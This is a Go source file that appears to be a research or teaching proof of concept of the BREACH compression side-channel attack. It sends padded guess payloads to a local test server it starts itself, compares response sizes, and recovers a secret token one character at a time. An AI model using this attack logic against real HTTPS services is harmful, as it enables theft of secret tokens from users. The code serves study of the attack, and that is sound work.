package cryptopener

import (
	"log"
	"io/ioutil"
	"os"
	//"sort"
	"time"
	"math/rand"
	
	client "github.com/larikuistio/cryptopener/client"
	testserver "github.com/larikuistio/cryptopener/testserver"
)

// Cryptopener a struct that defines cryptopener
type Cryptopener struct {
	// client for sending data to target server
	client *client.Client
	// token mutator that creates new payloads
	mutator *TokenMutator
	ResultToken string
	guess_count int
	correct_count int
	base_length int
	correct_length int
}

/*type Guess struct {
	size int
	char string
}

type GuessArray [62]Guess

var guesses GuessArray

func (g GuessArray) Len() int {
    return len(g)
}

func (g GuessArray) Less(i, j int) bool {
    return g[i].size < g[j].size
}

func (g GuessArray) Swap(i, j int) {
    g[i], g[j] = g[j], g[i]
}*/

// NewCryptopener creates new instance of Cryptopener
func NewCryptopener(address string, entry string) *Cryptopener {
	cryptopener := Cryptopener{
		client: client.NewClient(address, entry),
		mutator: NewMutator(),
	}
	return &cryptopener
}

func (p *Cryptopener) analyseResponse(response []byte/*, payload string*/) int {
	filename := "/tmp/tmpfile"
	ioutil.WriteFile(filename, response, os.FileMode(0666))
	fi, _ := os.Stat(filename)
	size := fi.Size()
	os.Remove(filename)
	log.Printf("Filesize: %d", size)



	/*if p.guess_count < 62 {
		guesses[p.guess_count].size = int(size)
		guesses[p.guess_count].char = payload[len(payload) - 1:]
		p.guess_count++

		if p.guess_count == 62 {
			sort.Sort(GuessArray(guesses))
			log.Printf("Next correct character is %s", guesses[0].char)
			p.ResultToken = p.ResultToken + guesses[0].char
			p.correct_count++
			p.guess_count = 0
			log.Printf("Result token is currently %s", p.ResultToken)
			time.Sleep(2 * time.Second)
		}
	}*/

	return int(size)
}

// Run starts BREACH attack
func (p *Cryptopener) Run() {
	rand.Seed(time.Now().Unix())
	server := testserver.NewTestServer()
	go server.Run()
	p.ResultToken = ""
	p.guess_count = 0
	p.correct_count = 0
	x := 0
	m := 1
	temp_length := 0
	var prev_payload []byte
	prev_payload = []byte("")
	flag0 := true
	flag1 := true
	flag2 := true
	for {
		if x == 0 {
			// create new payload
			var payload []byte
			if m == 1 {
				payload = []byte(string(prev_payload) + "#")
			} else if m == 2 {
				payload = []byte(string(prev_payload) + "##")
			} else if m == 3 {
				payload = []byte(string(prev_payload) + "###")
			} else if m == 4 {
				payload = []byte(string(prev_payload) + "####")
			}
			log.Printf("Sending payload: %s", string(payload))
			time.Sleep(100 * time.Millisecond)
			// send payload into a socket and then response into channel
			response := p.client.SendMessage(string(payload))
			p.base_length = p.analyseResponse(response/*, string(payload)*/)
			x = 1
		} else if x == 2 {
			for h := 0; h < 62 - p.guess_count; h++ {
				_, _ = p.mutator.NewPayload(true)
				x = 0
			}
			p.guess_count = 0
		} else if x == 1 {
			// create new payload
			var payload []byte
			if m == 1 {
				payload1, _ := p.mutator.NewPayload(true)
				payload = []byte(string(prev_payload) + string(payload1[len(payload1) - 1:]))
			} else if m == 2 {
				for a := 0; a < rand.Intn(64); a++ {
					_, _ = p.mutator.NewPayload(true)
				}
				payload1, _ := p.mutator.NewPayload(true)
				payload2, _ := p.mutator.NewPayload(true)
				payload = []byte(string(prev_payload) + string(payload1[len(payload1) - 1:]) + string(payload2[len(payload2) - 1:]))
			} else if m == 3 {
				for a := 0; a < rand.Intn(64); a++ {
					_, _ = p.mutator.NewPayload(true)
				}
				payload1, _ := p.mutator.NewPayload(true)
				payload2, _ := p.mutator.NewPayload(true)
				payload3, _ := p.mutator.NewPayload(true)
				payload = []byte(string(prev_payload) + string(payload1[len(payload1) - 1:]) + string(payload2[len(payload2) - 1:]) + string(payload3[len(payload3) - 1:]))
			} else if m == 4 {
				for a := 0; a < rand.Intn(64); a++ {
					_, _ = p.mutator.NewPayload(true)
				}
				payload1, _ := p.mutator.NewPayload(true)
				payload2, _ := p.mutator.NewPayload(true)
				payload3, _ := p.mutator.NewPayload(true)
				payload4, _ := p.mutator.NewPayload(true)
				payload = []byte(string(prev_payload) + string(payload1[len(payload1) - 1:]) + string(payload2[len(payload2) - 1:]) + string(payload3[len(payload3) - 1:]) + string(payload4[len(payload4) - 1:]))
			}
			
			log.Printf("Sending payload: %s", string(payload))
			// send payload into a socket and then response into channel
			response := p.client.SendMessage(string(payload))
			temp_length = p.analyseResponse(response/*, string(payload)*/)
			p.guess_count++

			if temp_length < p.base_length {
				time.Sleep(100 * time.Millisecond)
				p.correct_length = temp_length
				p.ResultToken = string(p.ResultToken) + string(payload[len(payload) - 1:])
				x = 2
				p.correct_count++
				prev_payload = payload
				m = 1
				flag0 = true
				flag1 = true
				flag2 = true
			} else if p.guess_count > 64 && flag0 {
				m = 2
				x = 0
				flag0 = false
			} else if p.guess_count > 128 && flag1 {
				p.guess_count = 0
				m = 3
				x = 0
				flag1 = false
			} else if p.guess_count > 196 && flag2 {
				p.guess_count = 0
				m = 4
				x = 0
				flag2 = false
			}
		}

		if p.correct_count == 64 {
			log.Printf("The guessed token is %s", p.ResultToken)
			log.Printf("Correct token is %s", server.Token)
			break
		}
	}
}
